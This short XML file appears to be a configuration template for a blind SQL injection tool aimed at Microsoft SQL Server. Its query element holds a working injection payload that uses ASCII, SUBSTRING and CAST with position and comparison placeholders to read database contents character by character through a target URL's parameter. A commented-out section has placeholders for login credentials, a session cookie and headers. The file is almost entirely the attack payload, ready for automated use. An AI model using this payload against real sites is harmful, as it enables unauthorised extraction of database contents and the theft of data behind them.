﻿<bsql>
  <author>
    Ferruh Mavituna - http://ferruh.mavituna.com
  </author>
  <name>Template - SQL Server - Blind SQL Injection</name>
  <query>
    <![CDATA[
    {{URL:Enter the URL of websites like http://www.example.com/}}?p=1 AND ISNULL(ASCII(SUBSTRING(CAST(({INJECTION})AS varchar(8000)),{POSITION},1)),0){OPERATION}{CHAR}--
    ]]>
  </query>
  <detectiontype><![CDATA[AutoSignatures]]></detectiontype>
<!-- 
<post>
    <![CDATA[
    user={{username:Yout login name}}&pass={{pass:Your password}}&someothershit=asdasdasd askdjhaksjdasd=asdas
    ]]>
  </post>
  <cookie>
    ASPSESSIONID={{SESSIONDID:Enter your session identifier}};    
  </cookie>
  <header>
    testheader: xxxxx
    test2: yyyyy
  </header>
  -->
</bsql>